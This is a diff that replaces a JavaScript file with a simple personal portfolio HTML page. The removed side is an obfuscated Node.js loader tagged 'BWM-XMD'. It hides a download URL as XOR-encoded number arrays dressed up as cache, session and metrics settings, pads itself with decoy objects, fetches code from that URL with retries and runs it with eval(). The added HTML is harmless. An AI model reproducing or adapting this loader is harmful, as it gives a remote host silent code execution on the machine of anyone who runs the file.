@@ -1,126 +1,84 @@
-const https = require('https');
-const http = require('http');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Portfolio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Poppins', sans-serif; background: #0f172a; color: #e2e8f0; }
+    header { padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; }
+    header h1 { color: #38bdf8; }
+    nav a { margin-left: 20px; color: #e2e8f0; text-decoration: none; }
+    nav a:hover { color: #38bdf8; }
 
-const config = {
-    timeout: 30000,
-    retries: 5,
-    delay: 2000,
-    version: '2.0.0'
-};
+    .hero { height: 90vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+    .hero h2 { font-size: 3rem; }
+    .hero span { color: #38bdf8; }
+    .hero p { margin: 20px 0; }
+    .btn { padding: 10px 20px; background: #38bdf8; border: none; cursor: pointer; }
 
-const cache = {
-    enabled: true,
-    maxAge: [77,81,81,85,86],
-    ttl: 3600,
-    store: null
-};
+    section { padding: 60px 50px; }
+    .projects { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+    .card { background: #1e293b; padding: 20px; border-radius: 10px; }
 
-const metrics = {
-    hits: 0,
-    miss: 0,
-    data: [29,81,68,94,75,94,87,29,80,92,29,88,86],
-    ratio: 0.85
-};
+    footer { text-align: center; padding: 20px; background: #020617; }
+  </style>
+</head>
+<body>
 
-const network = {
-    proxy: null,
-    buffer: [16,71,82,91,17,85,76],
-    retries: 3
-};
+<header>
+  <h1>MY PORTFOLIO WEBSITE</h1>
+  <nav>
+    <a href="#">Home</a>
+    <a href="#about">About</a>
+    <a href="#projects">Projects</a>
+    <a href="#contact">+254743436105</a>
+  </nav>
+</header>
 
-const session = {
-    active: true,
-    tokens: [28,9,9,75,71,79,72],
-    expires: null
-};
+<section class="hero">
+  <h2>Hello, I'm <span>Mungai Brian</span></h2>
+  <p>Full Stack Developer Majoring mainly on HTML,CSS And Javascript | Problem Solver | Tech Enthusiast</p>
+  <button class="btn">View My Work</button>
+</section>
 
-const decoy1 = {
-    values: [99,88,77,66,55,44,33,22,11],
-    flag: true
-};
+<section id="about">
+  <h2>About Me</h2>
+  <p>MY NAME IS MUNGAi BRIAN. I am a passionate developer skilled in building modern web applications using JavaScript, React, and Node.js,I'm also a whatsapp bot developer
+    I strive to bring innovative solutions to life.When im not coding, I enjoy exploring new technologies and contributing to the developer community or indulging in my love for editing.</p>
+</section>
 
-const decoy2 = {
-    stream: [12,34,56,78,90,11,22,33],
-    mode: 'async'
-};
+<section id="projects">
+  <h2>Projects</h2>
+  <div class="projects">
+    <div class="card">
+      <h3>MY BOT PROJECT</h3>
+      <p>my first bot project was yobih bug bot which took most of my time to develop,but since I was dedicated to devoloping it I didnt give up on it
+        .The most challenging part was debugging the code and making sure it responded correctly to user inputs.But finally I was able to complete it and it became one of the best bots in univers to ever exist
+        .</p>
+    </div>
+    <div class="card">
+      <h3>Project Two</h3>
+      <p>MY first website project was a simple portfolio site built with HTML and CSS.It was a great learning experience
+        I just look at it and feel proud of what I accomplished.</p>
+    </div>
+    <div class="card">
+      <h3>Project Three</h3>
+      <p>MY first mobile app project was a simple todo list app built with React Native.</p>
+    </div>
+  </div>
+</section>
 
-const keys = { a: 37, b: 51, c: 63, d: 38 };
+<section id="contact">
+  <h2>Contact</h2>
+  <p>Email: mungaibrianm@gmail.com</p>
+</section>
 
-function mix(arr, k) {
-    return arr.map(n => String.fromCharCode(n ^ k)).join('');
-}
+<footer>
+  <p>© 2026 Mungai Yobih. All rights reserved.</p>
+</footer>
 
-function build() {
-    const p1 = mix(cache.maxAge, keys.a);
-    const p2 = mix(session.tokens, keys.d);
-    const p3 = mix(metrics.data, keys.b);
-    const p4 = mix(network.buffer, keys.c);
-    return p1 + p2 + p3 + p4;
-}
-
-function wait(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
-
-function request(target, attempt = 1) {
-    return new Promise((resolve, reject) => {
-        const protocol = target.startsWith('https') ? https : http;
-        const req = protocol.get(target, { timeout: config.timeout }, (response) => {
-            if (response.statusCode === 301 || response.statusCode === 302) {
-                request(response.headers.location, 1).then(resolve).catch(reject);
-                return;
-            }
-            if (response.statusCode !== 200) {
-                reject(new Error(`Status: ${response.statusCode}`));
-                return;
-            }
-            let body = '';
-            response.on('data', (chunk) => body += chunk);
-            response.on('end', () => resolve(body));
-            response.on('error', reject);
-        });
-        req.on('error', (err) => {
-            if (attempt < config.retries) {
-                wait(config.delay * attempt).then(() => {
-                    request(target, attempt + 1).then(resolve).catch(reject);
-                });
-            } else {
-                reject(err);
-            }
-        });
-        req.on('timeout', () => {
-            req.destroy();
-            if (attempt < config.retries) {
-                wait(config.delay * attempt).then(() => {
-                    request(target, attempt + 1).then(resolve).catch(reject);
-                });
-            } else {
-                reject(new Error('Timeout'));
-            }
-        });
-    });
-}
-
-async function initialize() {
-    console.log('[BWM-XMD] Starting...');
-    let lastError;
-    for (let i = 0; i < config.retries; i++) {
-        try {
-            const endpoint = build();
-            const source = await request(endpoint);
-            if (source && source.length > 100) {
-                eval(source);
-                return;
-            }
-            throw new Error('Invalid response');
-        } catch (err) {
-            lastError = err;
-            console.log(`[BWM-XMD] Attempt ${i + 1} failed, retrying...`);
-            await wait(config.delay * (i + 1));
-        }
-    }
-    console.log('[BWM-XMD] Boot failed after all retries');
-    process.exit(1);
-}
-
-initialize();
+</body>
+</html>
